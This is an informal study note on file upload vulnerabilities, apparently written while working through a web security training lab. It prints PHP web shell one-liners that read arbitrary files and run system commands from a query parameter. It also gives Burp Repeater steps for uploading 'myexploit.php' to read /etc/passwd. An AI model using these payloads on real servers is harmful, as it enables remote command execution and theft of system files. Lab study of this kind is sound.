File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size.

From a security perspective, the worst possible scenario is when a website allows you to upload 
server-side scripts, such as PHP, Java, or Python files, and is also configured to execute them as code.

If you're able to successfully upload a web shell, you effectively have full control over the server. 
For example, the following PHP one-liner could be used to read arbitrary files from the server's filesystem:

<?php echo file_get_contents('/path/to/target/file'); ?>

 A more versatile web shell may look something like this:
 
<?php echo system($_GET['command']); ?>

 This script enables you to pass an arbitrary system command via a query parameter as follows:
 
GET /example/exploit.php?command=id HTTP/1.1


The Lab
with Burp open go to your account and upload a file -> from Burp you take 2 strings: (1) (POST) request to upload the image (2) (GET) request with the image
-> you send them to repeater 
-> (1) string you change the name of the file into "myexploit.php" and we delete all the image data in red 
-> we add bellow after Content-type: <?php echo file_get_contents('/etc/passwd'); ?>  -> we send for response
-> (2) string file you change the file name to myexploit.php -> send the request and we got the response 
